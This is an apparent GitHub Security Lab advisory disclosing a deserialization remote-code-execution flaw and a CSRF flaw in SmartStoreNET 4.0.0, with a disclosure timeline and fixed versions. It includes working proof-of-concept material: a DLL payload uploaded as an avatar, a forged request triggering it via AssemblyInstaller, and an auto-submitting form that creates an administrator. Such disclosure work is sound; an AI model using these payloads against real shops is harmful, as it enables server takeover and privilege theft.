<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">November 17, 2020</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-138, GHSL-2020-139: Remote code execution (RCE) and elevation of privileges (EoP) in SmartStoreNET - CVE-2020-27996, CVE-2020-27997</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396?s=35" height="35" width="35">
        <span>Jaroslav Lobacevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="summary">Summary</h2>

<p>Remote code execution (RCE) and elevation of privileges (EoP) vulnerabilities.</p>

<h2 id="product">Product</h2>

<p>SmartStoreNET</p>

<h2 id="tested-version">Tested Version</h2>

<p>4.0.0</p>

<h2 id="details">Details</h2>

<h3 id="issue-1-ghsl-2020-138-remote-code-execution-rce-by-unprivileged-user-because-of-custom-deserialization-of-untrusted-data">Issue 1: GHSL-2020-138 Remote code execution (RCE) by unprivileged user because of custom deserialization of untrusted data</h3>

<p>In the SmartStoreNET implementation of Model–View–Controller all models are derived from base class <a href="https://github.com/smartstore/SmartStoreNET/blob/525dd1b59052a0169f46ba0c93b479371fd1d59c/src/Presentation/SmartStore.Web.Framework/Modelling/ModelBase.cs#L15">ModelBase</a>. The class has a member property <a href="https://github.com/smartstore/SmartStoreNET/blob/525dd1b59052a0169f46ba0c93b479371fd1d59c/src/Presentation/SmartStore.Web.Framework/Modelling/ModelBase.cs#L62">CustomProperties</a> that is a <a href="https://github.com/smartstore/SmartStoreNET/blob/525dd1b59052a0169f46ba0c93b479371fd1d59c/src/Presentation/SmartStore.Web.Framework/Modelling/ModelBase.cs#L10">dictionary of string to any object</a>. SmartStoreNET implements a <a href="https://github.com/smartstore/SmartStoreNET/blob/525dd1b59052a0169f46ba0c93b479371fd1d59c/src/Presentation/SmartStore.Web.Framework/Modelling/SmartModelBinder.cs#L82">custom deserialization</a> of the user supplied request data to construct the dictionary in memory when a request is handled. For example for the excerpt of form-urlencoded <code class="language-plaintext highlighter-rouge">POST</code> request body below (formatted for readability):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CustomProperties%5BProviderConfigData%5D.__Type__=SmartStore.GoogleMerchantCenter.Models.ProfileConfigurationModel%2C+SmartStore.GoogleMerchantCenter%2C+Version%3D4.0.0.0%2C+Culture%3Dneutral%2C+PublicKeyToken%3Dnull&amp;
CustomProperties%5BProviderConfigData%5D.ExportShipping=false&amp;
CustomProperties%5BProviderConfigData%5D.SpecialPrice=true&amp;
CustomProperties%5BProviderConfigData%5D.SpecialPrice=false&amp;
CustomProperties%5BProviderConfigData%5D.ExportBasePrice=true&amp;
CustomProperties%5BProviderConfigData%5D.ExportBasePrice=false&amp;
CustomProperties%5BProviderConfigData%5D.AdditionalImages=true&amp;
CustomProperties%5BProviderConfigData%5D.AdditionalImages=false&amp;
CustomProperties%5BProviderConfigData%5D.ExpirationDays=0&amp;
CustomProperties%5BProviderConfigData%5D.Availability=&amp;
CustomProperties%5BProviderConfigData%5D.Gender=&amp;
CustomProperties%5BProviderConfigData%5D.AgeGroup=&amp;
CustomProperties%5BProviderConfigData%5D.Color=&amp;
CustomProperties%5BProviderConfigData%5D.Size=&amp;
CustomProperties%5BProviderConfigData%5D.Material=&amp;
CustomProperties%5BProviderConfigData%5D.Pattern=
</code></pre></div></div>

<p>an object of type <code class="language-plaintext highlighter-rouge">ProfileConfigurationModel</code> is created and its members get initialized by calling public setters.</p>

<p>A malicious user (Attacker) may send a forged request with a different object type and properties. The limitations are:</p>
<ol>
  <li>Only the root object type can be specified. The custom deserialization function doesn’t support handling custom types for properties.</li>
  <li>The type must have a public parameterless constructor.</li>
  <li>The constructor should not demand Single-Threaded-Apartment (STA).</li>
</ol>

<p>Since carefuly chosen setter invocation may trigger code execution with user supplied data this should be enough to execute arbitrary code by any authenticated user. Currently there is no <strong>publicly known</strong> type that satisfies all the limitations to execute arbitrary code from a request. However there is a type <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf">System.Configuration.Install.AssemblyInstaller</a> that satisfies it all, but requires a specially crafted .NET assembly be uploaded first.</p>

<p>To make a Proof of Concept (PoC) the following code can be compiled into mixed mode C++/CLI assembly:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define WIN32_LEAN_AND_MEAN
#include &lt;windows.h&gt;
#pragma unmanaged
</span>
<span class="k">extern</span> <span class="s">"C"</span> <span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hinstDLL</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">fwdReason</span><span class="p">,</span> <span class="kt">void</span><span class="o">*</span> <span class="n">lpvReserved</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fwdReason</span> <span class="o">==</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
        <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
        <span class="n">CreateProcess</span><span class="p">(</span><span class="s">L"C:</span><span class="se">\\</span><span class="s">WINDOWS</span><span class="se">\\</span><span class="s">system32</span><span class="se">\\</span><span class="s">calc.exe"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>The compiled dll can be renamed and uploaded as an avatar image, for example, if the feature is enabled on the server. During the avatar image upload the server renames the file, but the name can be inferred from the server response, e.g.:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
...
{
"$type":"&lt;&gt;f__AnonymousType40`2[[System.Boolean, mscorlib],[System.String, mscorlib]], SmartStore.Web",
"success":true,
"avatarUrl":"//localhost:65516/media/241/customer/mixedpoc.dll.bmp?size=256"
}
</code></pre></div></div>
<p>indicates that the file was renamed to <code class="language-plaintext highlighter-rouge">0000241.bmp</code>.
Once the file is uploaded the Attacker just needs to issue the following request (formatted for readability):</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /customer/addressadd HTTP/1.1
...
Address.Id=0&amp;
Address.Company=&amp;
Address.FirstName=fdfdf&amp;
Address.LastName=fdfdf&amp;
Address.Address1=2ewd&amp;
Address.Address2=&amp;
Address.City=fdffdf&amp;
Address.ZipPostalCode=1234&amp;
Address.CountryId=88&amp;
Address.StateProvinceId=0&amp;
Address.Email=asdf%40gmail.com&amp;
Address.PhoneNumber=12345678&amp;
Address.FaxNumber=&amp;
CustomProperties%5BProviderConfigData%5D.__Type__=System.Configuration.Install.AssemblyInstaller,%20System.Configuration.Install,%20Version%3d4.0.0.0,%20Culture%3dneutral,%20PublicKeyToken%3db03f5f7f11d50a3a&amp;
CustomProperties%5BProviderConfigData%5D.Path=file:///../../Presentation\SmartStore.Web\App_Data\Tenants\Default\Media\Storage\0000\0000241.bmp
</code></pre></div></div>
<p>The PoC triggers a payload from the uploaded dll on the first request. Since the dll stays attached in memory the Attacker needs to upload another file to execute the code again.</p>

<h4 id="impact">Impact</h4>

<p>The issue is not limited to the <code class="language-plaintext highlighter-rouge">addressadd</code> endpoint, but the specific endpoint requires authentication. However it is easy to register an account in a e-shop. As such this issue may lead to RCE by any authenticated user.</p>

<h3 id="issue-2-ghsl-2020-139-lack-of-cross-site-request-forgery-csrf-protection-may-lead-to-elevation-of-privileges">Issue 2: GHSL-2020-139 Lack of Cross Site Request Forgery (CSRF) protection may lead to elevation of privileges</h3>

<p>Most of SmartStoreNET’s state changing endpoints are not protected from CSRF attack. An obvious attack example would be to add a new administrator user through an CSRF attack when a logged-in existing administrator of SmartStoreNET visits a malicious site:</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://localhost:65516/admin/customer/create"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"save"</span> <span class="na">value=</span><span class="s">"save"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"Id"</span> <span class="na">value=</span><span class="s">"0"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"Username"</span> <span class="na">value=</span><span class="s">"Super"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"Email"</span> <span class="na">value=</span><span class="s">"super&amp;#64;super&amp;#46;com"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"Password"</span> <span class="na">value=</span><span class="s">"aaaaaa"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"FirstName"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"LastName"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"DateOfBirth"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"Company"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"AdminComment"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"SelectedCustomerRoleIds"</span> <span class="na">value=</span><span class="s">"1"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"SelectedCustomerRoleIds"</span> <span class="na">value=</span><span class="s">"3"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"IsTaxExempt"</span> <span class="na">value=</span><span class="s">"false"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"Active"</span> <span class="na">value=</span><span class="s">"true"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"Active"</span> <span class="na">value=</span><span class="s">"false"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"LoadedTabs"</span> <span class="na">value=</span><span class="s">"&amp;#35;customer&amp;#45;edit&amp;#45;1"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
    <span class="nt">&lt;script&gt;</span>
      <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
    <span class="nt">&lt;/script&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>
<p>Similar PoCs can be made for other operations. The only administrative endpoint protected from CSRF is <code class="language-plaintext highlighter-rouge">scheduletask/edit</code>. SmartStoreNET filters IP addresses an administrator is allowed to connect from, but this doesn’t protect from the CSRF attack because a legitimate administrator’s browser is tricked to perform the action in the context of a CSRF attack.</p>

<h4 id="impact-1">Impact</h4>

<p>A malicious site may trick a logged-in administrator or user to perform an action without the user’s consent.
Although it is partially mitigated by using <code class="language-plaintext highlighter-rouge">SameSite</code> cookies:</p>
<ol>
  <li>This <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#samesite-cookie-attribute">is not recommended</a> as the primary defense measure.</li>
  <li><code class="language-plaintext highlighter-rouge">SameSite</code> setting is configurable per SmartStoreNet deployment and may be set to <code class="language-plaintext highlighter-rouge">None</code>.</li>
</ol>

<h2 id="cve">CVE</h2>

<ul>
  <li>CVE-2020-27996 for GHSL-2020-138</li>
  <li>CVE-2020-27997 for GHSL-2020-139</li>
</ul>

<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>2020-07-27: Report sent to Vendor</li>
  <li>2020-07-28: Vendor acknowledges</li>
  <li>2020-08-26: Vendor <a href="https://github.com/smartstore/SmartStoreNET/commit/8702c6140f4fc91956ef35dba12d24492fb3f768">makes changes</a> to remediate the RCE</li>
  <li>2020-10-01: Vendor notified about the approaching disclosure deadline</li>
  <li>2020-10-07: Vendor releases v4.0.1 that addresses the RCE</li>
  <li>2020-10-29: Vendor notified that the deadline has passed, asking about the fix for CSRF.</li>
  <li>2020-10-29: Requested and got assigned CVE-2020-27996 (RCE GHSL-2020-138) and CVE-2020-27997 (CSRF GHSL-2020-139)</li>
  <li>2020-11-09: Vendor releases v4.1.0 that addresses the CSRF</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/JarLob">@JarLob (Jaroslav Lobačevski)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-138</code> or <code class="language-plaintext highlighter-rouge">GHSL-2020-139</code> in any communication regarding this i